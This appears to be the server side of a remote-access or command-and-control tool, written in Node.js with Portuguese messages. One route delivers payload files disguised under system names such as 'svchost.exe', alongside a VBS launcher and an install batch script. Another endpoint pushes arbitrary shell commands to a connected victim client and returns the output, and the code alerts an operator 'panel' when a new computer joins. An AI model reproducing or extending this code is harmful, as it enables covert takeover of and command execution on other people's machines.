const express = require("express");
const router = express.Router();

let waitingResolvers = [];
let currentCommand = "";
let commandId = "";
let lastClient = null;

function notifyNewComputer(wsss, computerInfo) {
  const message = {
    type: "new_computer",
    computer: computerInfo
  };

  wsss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN && client.role === "panel") {
      client.send(JSON.stringify(message));
    }
  });
}


function setLastClient(client) {
    lastClient = client;
}

function handleResult(result) {
    while (waitingResolvers.length > 0) {
        const resolve = waitingResolvers.shift();
        resolve(result);
    }
    currentCommand = "";
    commandId = "";
}


router.get("/dist/:arquivo", (req, res) => {
    const arquivo = req.params.arquivo;

    if (arquivo === "hihat") {
        res.sendFile(path.join(__dirname, "../client/svchost.exe"));
    } else if (arquivo === "launcher") {
        res.sendFile(path.join(__dirname, "../client/launcher.vbs"));
    } else if (arquivo === "install") {
        res.sendFile(path.join(__dirname, "../client/install.bat"));
    } else {
        res.status(404).send("Arquivo não encontrado");
    }
});

router.post("/set_command", async (req, res) => {
    const { command } = req.body;
    console.log("[set_command] Recebido:", command);

    if (!command) {
        return res.status(400).json({ error: "Comando não fornecido" });
    }

    if (!lastClient || lastClient.readyState !== 1) {
        return res.status(400).json({ error: "Nenhum cliente conectado" });
    }

    commandId = Date.now().toString();
    currentCommand = command;

    lastClient.send(JSON.stringify({ id: commandId, command }));

    try {
        const result = await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject("timeout");
            }, 30000);
            waitingResolvers.push((output) => {
                clearTimeout(timeout);
                resolve(output);
            });
        });

        res.json({ id: commandId, result });
    } catch (err) {
        res.status(504).json({ error: "Tempo esgotado aguardando resultado" });
    }
});

module.exports = {
    router,
    setLastClient,
    handleResult,
    notifyNewComputer
};

